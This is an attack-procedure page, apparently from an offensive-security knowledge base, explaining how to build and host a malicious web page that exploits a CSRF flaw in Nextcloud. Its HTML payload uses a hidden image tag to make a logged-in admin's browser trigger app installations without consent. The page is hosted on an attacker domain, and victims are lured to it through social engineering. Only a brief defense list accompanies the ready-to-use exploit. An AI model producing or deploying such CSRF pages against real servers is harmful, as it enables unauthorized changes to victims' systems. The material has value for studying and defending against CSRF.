---
tags:
  - csrf
  - web
  - html
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:29:09.905Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 46f23a86-02a6-491f-a48a-4ca89c1896d4
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Create-Malicious-CSRF-Page-for-Nextcloud

## Summary

This procedure outlines the creation of a malicious HTML webpage that exploits a CSRF vulnerability in Nextcloud by embedding a GET request to the /core/apps/recommended endpoint, triggering app installations without user consent.

## Description

In a CSRF attack, the goal is to craft a page that, when loaded by an authenticated user, sends unauthorized requests to the target application. For Nextcloud, the vulnerable endpoint accepts GET requests without validating the anti-CSRF token (requesttoken), allowing silent execution. The attacker hosts this page on a controlled domain and uses social engineering to direct the victim. Prerequisites include basic web development knowledge and a hosting service.

## Requirements

1. Access to a web hosting service or local server for the malicious page
2. Knowledge of the target's Nextcloud base URL
3. Authenticated admin session on the target (victim-side)

## Defense

Defensive measures and detection strategies:

- Implement CSRF tokens on all state-changing endpoints
- Use Content-Security-Policy (CSP) headers to restrict cross-origin requests
- Monitor for unexpected app installations in admin logs

## Objectives

1. Generate a webpage that initiates the CSRF request automatically
2. Ensure the request mimics a legitimate browser action
3. Host the page accessibly for luring the victim

## Instructions

### Step 1: Design the Malicious HTML

**Context**: Create an HTML file with an element that loads the vulnerable endpoint as a resource, triggering the GET request.

No specific command; use a text editor to write:

```html
<!DOCTYPE html>
<html>
<head><title>Innocuous Page</title></head>
<body>
<img src="https://target-nextcloud.com/nextcloud/index.php/core/apps/recommended" width="1" height="1" style="display:none;">
</body>
</html>
```

> This img tag fires the GET request on load. The target URL must match the victim's Nextcloud instance. Expected output: Page renders invisibly, request sent.

### Step 2: Host the Page

**Context**: Upload the HTML to a controlled domain to make it accessible.

Use your hosting provider's file manager or FTP to place the file at a URL like http://attacker.com/csrf-trigger.html.

> Expected output: Page is live and loads without errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[nextcloud]]
